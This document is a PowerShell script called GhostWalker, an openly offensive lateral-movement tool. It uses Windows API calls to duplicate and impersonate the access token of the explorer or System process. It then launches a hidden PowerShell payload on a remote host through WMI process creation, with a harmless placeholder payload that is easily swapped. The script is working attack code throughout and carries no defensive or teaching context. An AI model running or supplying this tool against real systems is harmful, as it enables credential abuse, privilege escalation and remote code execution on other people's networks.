# GhostWalker.ps1
# Stealth Lateral Movement with Token Impersonation + WMI Execution

# Parameters
param(
    [string]$TargetHost,
    [string]$Payload = "powershell -nop -w hidden -c \"Write-Host 'GhostWalker active on $env:COMPUTERNAME'\""
)

# Import PowerView or TokenManipulation module logic (assumes embedded or side-loaded)
function Invoke-TokenSteal {
    $proc = Get-Process | Where-Object { $_.ProcessName -like "explorer" -or $_.Id -eq 4 } | Select-Object -First 1
    if (!$proc) {
        Write-Host "[-] No viable process found for token duplication"
        return $null
    }

    $procId = $proc.Id
    $ntdll = Add-Type -MemberDefinition @'
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
'@ -Name "NativeMethods" -Namespace TokenSteal -PassThru

    $PROCESS_ALL_ACCESS = 0x1F0FFF
    $TOKEN_DUPLICATE = 0x0002
    $hProc = [TokenSteal.NativeMethods]::OpenProcess($PROCESS_ALL_ACCESS, $false, $procId)

    if ($hProc -eq 0) {
        Write-Host "[-] Failed to open target process"
        return $null
    }

    $token = [IntPtr]::Zero
    [TokenSteal.NativeMethods]::OpenProcessToken($hProc, $TOKEN_DUPLICATE, [ref]$token) | Out-Null

    $dupToken = [IntPtr]::Zero
    [TokenSteal.NativeMethods]::DuplicateToken($token, 2, [ref]$dupToken) | Out-Null

    if ($dupToken -eq [IntPtr]::Zero) {
        Write-Host "[-] Token duplication failed"
        return $null
    }

    if ([TokenSteal.NativeMethods]::ImpersonateLoggedOnUser($dupToken)) {
        Write-Host "[+] Token impersonation successful"
        return $true
    } else {
        Write-Host "[-] Token impersonation failed"
        return $null
    }
}

function Invoke-WMIPivot {
    param($Target, $Command)
    try {
        Write-Host "[*] Executing on remote host: $Target"
        Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName $Target -ArgumentList $Command
        Write-Host "[+] Payload executed remotely."
    } catch {
        Write-Host "[-] WMI execution failed: $_"
    }
}

# === MAIN ===
if (!(Invoke-TokenSteal)) {
    Write-Host "[!] Aborting pivot. Token impersonation failed."
    exit 1
}

Invoke-WMIPivot -Target $TargetHost -Command $Payload
